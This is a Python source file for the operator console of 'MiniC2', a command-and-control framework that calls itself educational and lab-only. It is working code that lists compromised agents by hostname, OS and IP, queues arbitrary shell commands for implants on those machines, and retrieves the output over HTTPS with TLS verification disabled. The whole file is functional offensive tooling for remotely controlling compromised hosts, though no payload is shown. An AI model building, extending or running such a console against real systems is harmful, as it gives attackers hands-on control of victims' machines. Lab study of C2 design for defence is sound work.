"""
operator.py — MiniC2 Operator Console

The operator console is the human interface to the C2 server. It talks to
server.py over HTTPS and lets you manage agents, send commands, and retrieve
results — all from a single interactive terminal session.

How it works:
  Commands aren't executed in real time. When you type a command, it's sent
  to the server as a "task" and sits in the queue until the agent's next
  beacon (typically within BEACON_INTERVAL seconds). After the agent picks it
  up and posts the result back, you retrieve it with the 'results' command.
  This async model mirrors how real-world C2 frameworks (Cobalt Strike, Sliver,
  etc.) work — there is no persistent stdin/stdout pipe to the target.

Usage:
    python operator.py                              # connects to localhost:4443
    python operator.py --host https://10.0.0.1:4443 # remote server

Commands:
    agents                   List all registered agents with last-seen timestamps
    use <agent_id>           Open an interactive pseudo-shell for a specific agent
    task <agent_id> <cmd>    Queue a one-off command without entering the shell
    results <agent_id>       View all task outputs received for an agent
    help                     Print command reference
    exit / quit              Quit the console
"""

import argparse
import sys
import textwrap

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Configuration ─────────────────────────────────────────────────────────────
DEFAULT_HOST = "https://127.0.0.1:4443"
# ─────────────────────────────────────────────────────────────────────────────

BANNER = r"""
  ███╗   ███╗██╗███╗   ██╗██╗      ██████╗██████╗
  ████╗ ████║██║████╗  ██║██║     ██╔════╝╚════██╗
  ██╔████╔██║██║██╔██╗ ██║██║     ██║      █████╔╝
  ██║╚██╔╝██║██║██║╚██╗██║██║     ██║     ██╔═══╝
  ██║ ╚═╝ ██║██║██║ ╚████║███████╗╚██████╗███████╗
  ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚══════╝
  Educational C2 Framework — Lab Use Only
  ─────────────────────────────────────────────────
  Type 'help' to list commands.
"""

HELP_TEXT = """
  agents                   — list all beaconing agents
  use <agent_id>           — interactive pseudo-shell for an agent
  task <agent_id> <cmd>    — queue one command (non-interactive)
  results <agent_id>       — view all task results for an agent
  exit / quit              — quit the operator console
"""


class OperatorConsole:
    def __init__(self, host: str):
        self.host    = host.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False     # self-signed cert is fine in the lab

    # ── HTTP helpers ──────────────────────────────────────────────────────────

    def _get(self, path: str):
        try:
            r = self.session.get(f"{self.host}{path}", timeout=5)
            r.raise_for_status()
            return r.json()
        except requests.exceptions.ConnectionError:
            print(f"[-] Cannot reach server at {self.host}. Is server.py running?")
            return None
        except Exception as e:
            print(f"[-] Request failed: {e}")
            return None

    def _post(self, path: str, data: dict):
        try:
            r = self.session.post(f"{self.host}{path}", json=data, timeout=5)
            r.raise_for_status()
            return r.json()
        except requests.exceptions.ConnectionError:
            print(f"[-] Cannot reach server at {self.host}. Is server.py running?")
            return None
        except Exception as e:
            print(f"[-] Request failed: {e}")
            return None

    # ── Commands ──────────────────────────────────────────────────────────────

    def list_agents(self):
        agents = self._get("/agents")
        if agents is None:
            return
        if not agents:
            print("[-] No agents have checked in yet.")
            return

        header = f"\n  {'AGENT ID':<38} {'HOSTNAME':<18} {'OS':<22} {'IP':<16} LAST SEEN"
        print(header)
        print("  " + "─" * 110)
        for a in agents:
            print(
                f"  {a['id']:<38} {(a['hostname'] or '?'):<18} "
                f"{(a['os'] or '?'):<22} {(a['ip'] or '?'):<16} {a['last_seen']}"
            )
        print()

    def queue_task(self, agent_id: str, command: str):
        resp = self._post("/task", {"agent_id": agent_id, "command": command})
        if resp:
            print(f"[+] Task queued — ID: {resp['task_id']}")

    def show_results(self, agent_id: str):
        results = self._get(f"/results/{agent_id}")
        if results is None:
            return
        if not results:
            print("[-] No results yet for this agent.")
            return

        for r in results:
            task_short = r["task_id"][:8]
            print(f"\n  ┌─ Task {task_short}...  @ {r['received_at']}")
            for line in (r.get("output") or "(no output)").splitlines():
                print(f"  │ {line}")
            print("  └" + "─" * 60)

    def interactive_shell(self, agent_id: str):
        """
        Open an interactive pseudo-shell scoped to a single agent.

        This is *not* a real-time shell. Every command you type is queued on
        the server and delivered to the agent on its next beacon. After waiting
        for the beacon interval (default ~10s), type 'results' to retrieve the
        output. This is the standard async model used by production C2 frameworks
        — the implant is always the one initiating contact; the server never
        pushes data unprompted.
        """
        short = agent_id[:8]
        print(f"\n[*] Shell opened for agent {short}...")
        print("[!] Commands are async. Type 'results' after the beacon interval "
              "to see output.\n")
        while True:
            try:
                raw = input(f"  c2({short})> ").strip()
            except (KeyboardInterrupt, EOFError):
                print("\n[*] Closing shell.")
                break

            if not raw:
                continue
            if raw in ("exit", "back"):
                break
            elif raw == "help":
                print(HELP_TEXT)
            elif raw == "results":
                self.show_results(agent_id)
            else:
                self.queue_task(agent_id, raw)

    # ── Main REPL ─────────────────────────────────────────────────────────────

    def run(self):
        print(BANNER)
        while True:
            try:
                raw = input("c2> ").strip()
            except (KeyboardInterrupt, EOFError):
                print("\n[*] Exiting.")
                sys.exit(0)

            if not raw:
                continue

            parts = raw.split(None, 2)          # max 3 tokens
            cmd   = parts[0].lower()

            if cmd in ("exit", "quit"):
                print("[*] Goodbye.")
                sys.exit(0)

            elif cmd == "help":
                print(HELP_TEXT)

            elif cmd == "agents":
                self.list_agents()

            elif cmd == "use":
                if len(parts) < 2:
                    print("[-] Usage: use <agent_id>")
                else:
                    self.interactive_shell(parts[1])

            elif cmd == "task":
                if len(parts) < 3:
                    print("[-] Usage: task <agent_id> <command>")
                else:
                    self.queue_task(parts[1], parts[2])

            elif cmd == "results":
                if len(parts) < 2:
                    print("[-] Usage: results <agent_id>")
                else:
                    self.show_results(parts[1])

            else:
                print(f"[-] Unknown command: '{cmd}'. Type 'help'.")


# ── Entry point ───────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(description="MiniC2 Operator Console")
    p.add_argument(
        "--host", default=DEFAULT_HOST,
        help=f"C2 server URL (default: {DEFAULT_HOST})"
    )
    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    OperatorConsole(args.host).run()
